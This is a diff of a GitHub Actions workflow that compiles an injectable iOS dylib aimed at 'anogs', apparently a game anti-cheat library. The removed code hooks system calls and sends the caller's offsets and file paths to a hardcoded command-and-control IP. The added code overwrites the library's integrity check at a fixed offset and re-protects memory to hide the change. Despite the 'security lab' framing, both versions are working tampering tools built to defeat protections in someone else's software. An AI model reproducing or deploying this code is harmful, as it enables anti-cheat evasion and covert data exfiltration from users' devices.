@@ -1,4 +1,4 @@
-name: Security Audit - Anogs Binary Sniper
+name: Imperial V-MAX - anogs Runtime Patcher
 
 on:
   push:
@@ -6,138 +6,104 @@ on:
   workflow_dispatch:
 
 jobs:
-  build_sniper:
-    name: Compile Anogs Strict Sniper
+  build_patcher:
+    name: Compile anogs Live Memory Patcher
     runs-on: macos-latest
 
     steps:
       - name: Checkout Code
         uses: actions/checkout@v4
 
-      - name: Download Fishhook
+      - name: Generate C++ Payload (Main.mm)
         run: |
-          mkdir -p jni
-          curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.c -o jni/fishhook.c
-          curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.h -o jni/fishhook.h
-
-      - name: Generate Sniper Source
-        run: |
-          cat <<'EOF' > jni/main.mm
+          cat <<'EOF' > main.mm
           #import <Foundation/Foundation.h>
-          #import <sys/socket.h>
-          #import <arpa/inet.h>
-          #import <dlfcn.h>
           #import <mach-o/dyld.h>
-          #import <sys/sysctl.h>
-          #include "fishhook.h"
+          #import <mach/mach.h>
+          #import <sys/mman.h>
 
-          // ⚠️ C2 IP (Masoud RDP)
-          #define C2_IP "44.192.33.117"
-          #define C2_PORT 8080
+          /**
+           * ========================================================
+           * 🛡️ MASOUD SECURITY LAB - RUNTIME MEMORY PATCHER
+           * 🎯 TARGET: anogs.dylib
+           * ⚙️ ACTION: Safely blind the Integrity Checker at 0x459C
+           * ========================================================
+           */
 
-          static int (*orig_sysctlbyname)(const char *name, void *oldp, size_t *oldlenp, void *newp, size_t newlen);
-          static void* (*orig_dlsym)(void* handle, const char* symbol);
-          static FILE* (*orig_fopen)(const char *filename, const char *mode);
-          static int (*orig_access)(const char *path, int amode);
+          // 1. تعريف البايتات السحرية (MOV X0, #0) في معمارية ARM64
+          // هذا الكود يخبر المعالج بإرجاع قيمة "صفر" بدون التسبب في كراش
+          uint8_t safe_patch_bytes[] = {0x00, 0x00, 0x80, 0xD2};
 
-          void SendToRadar(NSDictionary *data) {
-              dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
-                  NSData *json = [NSJSONSerialization dataWithJSONObject:data options:0 error:nil];
-                  if (!json) return;
-                  int sock = socket(AF_INET, SOCK_STREAM, 0);
-                  if (sock < 0) return;
-                  struct sockaddr_in srv;
-                  srv.sin_family = AF_INET; srv.sin_port = htons(C2_PORT);
-                  inet_pton(AF_INET, C2_IP, &srv.sin_addr);
-                  struct timeval tv = {1, 0}; setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
-                  if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) == 0) send(sock, [json bytes], [json length], 0);
-                  close(sock);
-              });
+          // 2. دالة كسر حماية الذاكرة وزرع البايتات
+          void PatchMemory(uintptr_t address, uint8_t* patch_data, size_t length) {
+              // حساب بداية الصفحة في الذاكرة (ضروري لنظام iOS)
+              uintptr_t page_start = address & ~(PAGE_SIZE - 1);
+              
+              // أ: إزالة الحماية وجعل الذاكرة قابلة للقراءة والكتابة والتنفيذ (RWX)
+              mprotect((void*)page_start, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC);
+              
+              // ب: زرع البايتات الجديدة فوق القديمة
+              memcpy((void*)address, patch_data, length);
+              
+              // ج: تنظيف ذاكرة التخزين المؤقت للمعالج (Instruction Cache)
+              // خطوة احترافية جداً لمنع الكراش في معالجات ARM64
+              __builtin___clear_cache((char*)address, (char*)address + length);
+              
+              // د: إعادة الحماية للذاكرة (قراءة وتنفيذ فقط RX) لإخفاء الأثر
+              mprotect((void*)page_start, PAGE_SIZE, PROT_READ | PROT_EXEC);
           }
 
-          // 🎯 القناص: فحص هوية المستدعي واستخراج الأوفست الحقيقي (Real IDA Offset)
-          BOOL IsAnogsAndReport(const char* func, const char* target, const char* extra_data) {
-              void* ret_addr = __builtin_return_address(0);
-              Dl_info info;
-              
-              if (dladdr(ret_addr, &info) && info.dli_fname) {
-                  NSString *caller = [[NSString stringWithUTF8String:info.dli_fname] lowercaseString];
+          // 3. دالة البحث عن anogs وتطبيق الباتش
+          void ExecuteAnogsPatch() {
+              for (uint32_t i = 0; i < _dyld_image_count(); i++) {
+                  const char* image_name = _dyld_get_image_name(i);
                   
-                  // 🔥 فلتر حديدي: نستهدف anogs فقط! نتجاهل اللعبة لعدم التعليق.
-                  if ([caller containsString:@"anogs"]) {
+                  if (strstr(image_name, "anogs")) {
+                      // الحصول على العنوان الأساسي للملف في الذاكرة (Base Address)
+                      uintptr_t base_addr = (uintptr_t)_dyld_get_image_header(i);
                       
-                      // 💡 حساب الأوفست الحقيقي للملف المشفر:
-                      // بدل أن نطرح Base Address العادي (الذي يتغير في الذاكرة المنفكة)، 
-                      // يجب طرح הـ Slide (الإزاحة العشوائية لـ ASLR) لنحصل على الأوفست المطابق لـ IDA Pro.
-                      uintptr_t slide = 0;
+                      // الأوفست الذهبي الذي اكتشفه مسعود
+                      uintptr_t target_offset = 0x459C;
+                      
+                      // حساب العنوان الفعلي في الذاكرة
+                      uintptr_t effective_address = base_addr + target_offset;
+                      
+                      // تنفيذ عملية الزرع
+                      PatchMemory(effective_address, safe_patch_bytes, sizeof(safe_patch_bytes));
+                      
+                      NSLog(@"[MASOUD LAB] 🦅 BOOM! anogs integrity check blinded at 0x%lx", effective_address);
+                      return; // الخروج بعد نجاح العملية
+                  }
+              }
+          }
+
+          // 4. خيط مراقبة يعمل في الخلفية لانتظار تحميل anogs
+          void StartMemorySniper() {
+              dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+                  bool isPatched = false;
+                  // حلقة تكرارية تفحص الذاكرة كل ثانية
+                  while(!isPatched) {
                       for (uint32_t i = 0; i < _dyld_image_count(); i++) {
-                          if (strcmp(_dyld_get_image_name(i), info.dli_fname) == 0) {
-                              slide = _dyld_get_image_vmaddr_slide(i);
+                          if (strstr(_dyld_get_image_name(i), "anogs")) {
+                              // إذا وجدنا الملف، ننتظر ثانية واحدة ليكتمل تحميله بالكامل
+                              sleep(1); 
+                              ExecuteAnogsPatch();
+                              isPatched = true;
                               break;
                           }
                       }
-                      
-                      // IDA Offset = Return Address - ASLR Slide
-                      uintptr_t real_ida_offset = (uintptr_t)ret_addr - slide;
-                      
-                      // فلترة مسارات اللعبة المزعجة التي تسبب التعليق
-                      if (target && strstr(target, ".pak")) return YES;
-                      
-                      SendToRadar(@{
-                          @"func": [NSString stringWithUTF8String:func],
-                          @"offset": [NSString stringWithFormat:@"0x%lx", real_ida_offset],
-                          @"target": target ? [NSString stringWithUTF8String:target] : @"NULL",
-                          @"data": extra_data ? [NSString stringWithUTF8String:extra_data] : @"N/A"
-                      });
-                      return YES;
+                      if (!isPatched) {
+                          sleep(1); // إذا لم نجده، انتظر ثانية وحاول مرة أخرى
+                      }
                   }
-              }
-              return NO;
-          }
-
-          // ==================== HOOKS ====================
-
-          // 1. فحص الجلبريك العميق (الأخطر)
-          int hk_sysctlbyname(const char *name, void *oldp, size_t *oldlenp, void *newp, size_t newlen) {
-              IsAnogsAndReport("sysctlbyname", name, NULL);
-              return orig_sysctlbyname(name, oldp, oldlenp, newp, newlen);
-          }
-
-          // 2. البحث عن دوال الغش بالذاكرة
-          void* hk_dlsym(void* handle, const char* symbol) {
-              IsAnogsAndReport("dlsym", symbol, NULL);
-              return orig_dlsym(handle, symbol);
-          }
-
-          // 3. فتح الملفات المشبوهة لقراءة الكود منها
-          FILE* hk_fopen(const char *filename, const char *mode) {
-              IsAnogsAndReport("fopen", filename, mode);
-              return orig_fopen(filename, mode);
-          }
-
-          // 4. فحص الوجود (مع فلترة لعدم التعليق)
-          int hk_access(const char *path, int amode) {
-              static __thread bool is_logging = false;
-              if (!is_logging) {
-                  is_logging = true;
-                  IsAnogsAndReport("access", path, NULL);
-                  is_logging = false;
-              }
-              return orig_access(path, amode);
-          }
-
-          __attribute__((constructor))
-          static void init_sniper() {
-              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
-                  SendToRadar(@{@"func": @"INIT"});
-                  struct rebinding hooks[] = {
-                      {"sysctlbyname", (void *)hk_sysctlbyname, (void **)&orig_sysctlbyname},
-                      {"dlsym", (void *)hk_dlsym, (void **)&orig_dlsym},
-                      {"fopen", (void *)hk_fopen, (void **)&orig_fopen},
-                      {"access", (void *)hk_access, (void **)&orig_access}
-                  };
-                  rebind_symbols(hooks, 4);
               });
+          }
+
+          // نقطة البداية (تعمل تلقائياً عند حقن الدايلب)
+          __attribute__((constructor))
+          static void init_patcher() {
+              NSLog(@"[MASOUD LAB] 🛡️ Live Memory Patcher Initialized. Waiting for target...");
+              StartMemorySniper();
           }
           EOF
 
@@ -145,12 +111,12 @@ jobs:
         run: |
           clang++ -dynamiclib -std=c++11 -arch arm64 \
           -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
-          jni/main.mm jni/fishhook.c -o Anogs-Binary-Sniper.dylib \
+          main.mm -o Masoud-Live-Patcher.dylib \
           -framework Foundation
-          strip -x Anogs-Binary-Sniper.dylib
+          strip -x Masoud-Live-Patcher.dylib
 
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Anogs-Binary-Sniper
-          path: Anogs-Binary-Sniper.dylib
+          name: Masoud-Live-Patcher
+          path: Masoud-Live-Patcher.dylib
